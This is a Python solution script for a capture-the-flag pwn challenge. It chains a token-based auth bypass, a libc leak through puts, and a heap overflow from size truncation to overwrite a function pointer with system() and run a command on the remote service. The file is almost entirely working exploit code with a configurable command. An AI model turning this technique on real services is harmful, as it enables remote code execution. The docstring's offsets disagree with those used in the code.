#!/usr/bin/env python3
"""
Operation Midnight Drop -- PTITCTF2026 Pwn
==========================================
Custom "Threat Intel Engine v3.0" protocol pwn.

Vulnerability chain
-------------------
1. AUTH: packet type 2, payload = token ^ 0xc0ffee00  (token printed in banner).
2. REPORT 'P' leak:  "proc cookie" = cookie(puts@GOT=0x3fe0) -> recover libc `puts`.
   cookie(x) = ((token&0xffffffff)<<12) ^ x ^ 0x5a5a5a5a41414141
3. RULE handler has a heap overflow on update:
     memcpy(slot, payload+2, rlen)   // no capacity check
   `size = align8(rlen)` uses 8-bit truncation: (rlen+7)&0xff & ~7
   => rlen can be large (e.g. 0x100) while the size<=0x80 check passes.
4. Heap layout (confirmed empirically on remote glibc 2.29):
     report = slot + 0x60
     report+0x20 (function pointer) = slot + 0x80
   Overflow writes:
     slot+0x60 = "cat /home/ctf/flag.txt\0"   (report[0], command for system)
     slot+0x80 = system(libc)                 (report->fp)
5. ANALYZE (type 5) calls  report->fp(report, arg)  ==  system("cat /home/ctf/flag.txt")

Remote libc identified from the puts leak = glibc 2.29-0ubuntu2
  puts=0x83cc0  system=0x52fd0
"""

import socket, struct, sys, re, time

HOST = sys.argv[1] if len(sys.argv) > 1 else "144.79.188.39"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 37082
# Ubuntu 24.04 glibc 2.39 (puts 0x87cc0). 2.29 0x83cc0 also ends in 0xcc0 — do not mix.
PUTS_OFF = 0x87CC0
SYSTEM_OFF = 0x58750
C = 0x5a5a5a5a41414141
# RULE malloc(0x80) then REPORT 0x128: report = slot+0xb0, fp = slot+0xd0
CMD_OFF = 0xB0
FP_OFF = 0xD0


def rd(s, t=2.0):
    s.settimeout(t); buf = b""
    try:
        while True:
            d = s.recv(4096)
            if not d: break
            buf += d
    except socket.timeout:
        pass
    return buf


def checksum(ptype, plen, payload, token):
    x = ((((ptype << 24) & 0xffffffff) ^ token) & 0xffffffff) ^ plen
    x ^= 0x31415926; x &= 0xffffffff
    for i in range(plen):
        x = ((x << 5) | (x >> 27)) & 0xffffffff
        x = (x + ((i * 0x45d9f3b) ^ payload[i])) & 0xffffffff
    return x & 0xffffffff


def send_packet(s, ptype, payload, token):
    plen = len(payload)
    ck = checksum(ptype, plen, payload, token)
    s.sendall(f"{ptype}\n{plen}\n{ck:x}\n".encode() + payload)


def exploit(host, port, cmd=b"cat /home/ctf/flag.txt"):
    s = socket.create_connection((host, port), timeout=8)
    banner = rd(s, 2.0)
    m = re.search(rb"session token: ([0-9a-f]{8})", banner)
    if not m:
        return None
    token = int(m.group(1), 16)
    tok12 = (token & 0xffffffff) << 12

    def pkt(ptype, payload, t=2.0):
        send_packet(s, ptype, payload, token)
        return rd(s, t)

    # 1. auth
    pkt(2, struct.pack("<I", (token ^ 0xc0ffee00) & 0xffffffff))
    # 2. rule slot malloc(0x80) so overflow reaches the following REPORT
    pkt(3, struct.pack("<H", 0x80) + b"A" * 0x80)
    # 3. report create
    pkt(4, b"Z")
    # 4. leak puts via 'P'
    r = pkt(4, b"P")
    mm = re.search(rb"proc cookie: 0x([0-9a-f]+)", r)
    if not mm:
        s.close(); return None
    puts = (int(mm.group(1), 16) ^ C ^ tok12) & 0xffffffffffffffff
    libc_base = puts - PUTS_OFF
    system = (libc_base + SYSTEM_OFF) & 0xffffffffffffffff

    # 5. overflow: align8(0x100) truncates to 0 then becomes 8, check <=0x80 passes
    cmd = cmd + b"\x00"
    rlen = 0x100
    ov = bytearray(rlen)
    ov[CMD_OFF:CMD_OFF + len(cmd)] = cmd
    struct.pack_into("<Q", ov, FP_OFF, system)
    pkt(3, struct.pack("<H", rlen) + bytes(ov))

    # 6. ANALYZE -> system(cmd)
    out = pkt(5, b"", t=4.0)
    s.close()
    return out


if __name__ == "__main__":
    print(f"[*] target {HOST}:{PORT}")
    out = exploit(HOST, PORT, cmd=b"cat /home/ctf/flag.txt")
    if out is None:
        raise SystemExit("[-] connection/token failed")
    sys.stdout.buffer.write(out)
    sys.stdout.buffer.flush()
    if b"PTITCTF{" in out:
        print("\n[+] FLAG FOUND")
